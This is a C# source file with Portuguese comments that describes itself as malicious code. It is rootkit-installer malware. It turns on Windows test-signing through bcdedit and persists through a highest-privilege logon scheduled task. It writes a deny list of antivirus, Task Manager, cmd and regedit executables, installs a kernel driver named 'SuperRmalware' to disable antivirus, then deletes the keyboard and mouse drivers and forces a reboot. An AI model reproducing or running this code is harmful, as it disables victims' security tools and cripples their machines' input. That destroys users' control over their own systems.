using System;
using System.IO;

namespace First
{
    public class Program
    {
        /*
        
            Este arquivo serve para sabermos se o código inicial foi executado (o que ativa
            o Windows em modo de teste), se ele não existir, o código não foi executado
            
            Então, depois que executarmos o código, vamos criar esse arquivo, para sabermos
            que o modo de teste já foi concluido, e que ele instale os drivers necessários
            Para que possamos prosseguir

        */
        static bool modoTeste = File.Exists("C:\\Windows\\bcEnabled");

        /// <summary>
        /// Lista de executáveis dos antivírus
        /// </summary>
        static string[] antivirusArquivos =
        {
            // Kaspersky
            "AVP.EXE",
            "AVPUI.EXE",

            // Avast
            "AVASTUI.EXE",
            "AVASTSVC.EXE",
            "AFWSERV.EXE",
            "INSTUP.EXE",

            // Windows Defender
            "MSMPENG.EXE",

            // Malwarebytes
            "MBAMSERVICE.EXE",
            "MBAM.EXE",

            // Gerenciador de tarefas
            "TASKMGR.EXE",
            "CMD.EXE",
            "CONHOST.EXE",
            "TASKKILL.EXE",
            "REGEDIT.EXE",
            "PROCESSHACKER.EXE"
        };

        /// <summary>
        /// Inicia um processo em segundo plano
        /// </summary>
        /// <param name="arquivo"></param>
        /// <param name="argumentos"></param>
        /// <returns></returns>
        private static async System.Threading.Tasks.Task IniciarProcesso(string arquivo, string argumentos)
        {
            // Só para remover o "aviso" do Visual Studio XD
            await System.Threading.Tasks.Task.Delay(1);

            // Novo processo
            System.Diagnostics.Process processo = new System.Diagnostics.Process();

            // Nome do executável
            processo.StartInfo.FileName = arquivo;

            // Os argumentos que vão iniciar junto com o processo
            processo.StartInfo.Arguments = argumentos;

            // Não crie uma janela
            processo.StartInfo.CreateNoWindow = true;

            // Não use Shell ao executar o arquivo
            processo.StartInfo.UseShellExecute = false;

            // Inicie o arquivo como administrador
            processo.StartInfo.Verb = "runas";

            // Inicie o processo escondido, em segundo plano
            processo.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            // Inicie o processo
            processo.Start();
            
            // Espere o programa terminar
            processo.WaitForExit();

            try
            {
                // O código executou sem erros, ótimo, então agora
                // Crie este arquivo, o modo de teste foi ativado
                File.Create("C:\\Windows\\bcEnabled").Close();
            } catch (Exception) { }
        }

        /// <summary>
        /// Instala os drivers necessários para desabilitar os antivírus e instalar o rootkit
        /// </summary>
        /// <returns></returns>
        private static async System.Threading.Tasks.Task InstalarDrivers()
        {
            // Pasta de instalação
            string pastaInicial = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location) + "\\INF\\";

            // Pasta onde está o driver de 32 bits
            string pastaDriver = pastaInicial + "X86\\";

            // Se for um sistema de 64 bits
            if (Environment.Is64BitProcess)
            {
                // Altere para o driver de 64 bits
                pastaDriver = pastaInicial + "X64\\";
            }

            // Arquivo de instalação para o driver
            string inf = pastaDriver + "driver.inf";

            // Instale o driver
            await IniciarProcesso("cmd.exe", "/c C:\\Windows\\System32\\InfDefaultInstall.exe " + '"' + inf + '"');

            // Inicie o driver
            await IniciarProcesso("sc.exe", "start SuperRmalware");
        }

        /// <summary>
        /// Código malicioso, tudo será executado quando essa função for chamada
        /// </summary>
        public async static void Main()
        {
            if (modoTeste == false)
            {
                // Espere a função ser concluida antes de continuar
                // Ela vai fazer com que o Windows fique em modo de teste
                // Permitindo assim, instalar nosso driver
                await IniciarProcesso("bcdedit.exe", "-set testsigning on");

                // Local do executavél
                string local = System.Reflection.Assembly.GetEntryAssembly().Location;

                // Crie um evento no agendador de tarefas, fazendo o aplicativo se reabrir
                // Sozinho (como administrador) após a reinicialização do computador
                await IniciarProcesso("schtasks.exe", "/F /RL HIGHEST /CREATE /TN Instalacao /tr " + '"' + local + '"' + " /SC ONLOGON /EC APPLICATION");

                // Crie um arquivo, e apague tudo nele
                File.WriteAllText("C:\\Windows\\System32\\deny.txt", "");

                // Veja a string de todos os antivírus
                foreach (string av in antivirusArquivos)
                {
                    // Adicione o AV na lista
                    File.AppendAllText("C:\\Windows\\System32\\deny.txt", av + Environment.NewLine);
                }
            } else
            {
                // Ok, vamos instalar os drivers para começar a bagunça
                await InstalarDrivers();

                // Delete o driver de teclado e mouse
                await IniciarProcesso("sc.exe", "delete kbdclass");
                await IniciarProcesso("sc.exe", "delete kbdhid");
                await IniciarProcesso("sc.exe", "delete mouclass");

                // Reinicie o PC
                await IniciarProcesso("shutdown.exe", "-r -t 2");
            }
        }

    }
}
